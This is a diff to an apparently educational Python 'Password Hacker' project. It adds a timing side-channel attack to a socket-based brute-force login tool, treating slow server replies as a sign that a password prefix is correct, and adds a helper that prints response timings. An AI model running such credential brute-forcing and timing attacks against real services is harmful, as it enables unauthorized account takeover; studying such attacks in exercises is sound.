@@ -3,6 +3,7 @@ from inspect import stack
 from json import dumps, loads
 from socket import socket
 from string import ascii_letters, digits
+from time import perf_counter
 
 LOGINS = r"C:\Users\filip\OneDrive\PycharmProjects\Password Hacker (Python)\logins.txt"
 
@@ -53,7 +54,7 @@ def get_passwords():
             raise LookupError(f"{ALPHABET=} exhausted without a match!")
 
 
-def brute_force(client, login=None):
+def brute_force(client, login=None, threshold=0.01):
     generator = get_logins() if login is None else get_passwords()
 
     for candidate in generator:
@@ -64,14 +65,18 @@ def brute_force(client, login=None):
 
         credentials = Credentials(*credentials)
 
+        start = perf_counter()
         client.send(credentials.to_json().encode())
-        response = client.recv(1024).decode()
+        response = client.recv(1024)
+        time = perf_counter() - start
+
+        response = response.decode()
         response = loads(response)
 
         if login is None and response == WRONG_PASSWORD:
             # Found login
             return candidate
-        elif response == EXCEPTION:
+        elif time > threshold:
             # Found partial password
             generator.send(candidate)
             continue
@@ -85,6 +90,23 @@ def brute_force(client, login=None):
             raise ValueError(f"Bad credentials! {credentials=}")
 
 
+def print_times(client, login):
+    times = []
+    for i, candidate in zip(range(len(ALPHABET)), get_passwords()):
+        credentials = Credentials(login, candidate)
+
+        start = perf_counter()
+        client.send(credentials.to_json().encode())
+        client.recv(1024)
+        time = perf_counter() - start
+
+        times.append(time)
+
+        print(f"{i=:<2}  {time=:.3f}  {candidate=}")
+
+    print(f"   AVERAGE={sum(times) / len(times)}")
+
+
 def main():
     address = get_address()
 
@@ -92,6 +114,7 @@ def main():
         client.connect(address)
 
         login = brute_force(client)
+        # print_times(client, login)
         password = brute_force(client, login)
 
     credentials = Credentials(login, password)
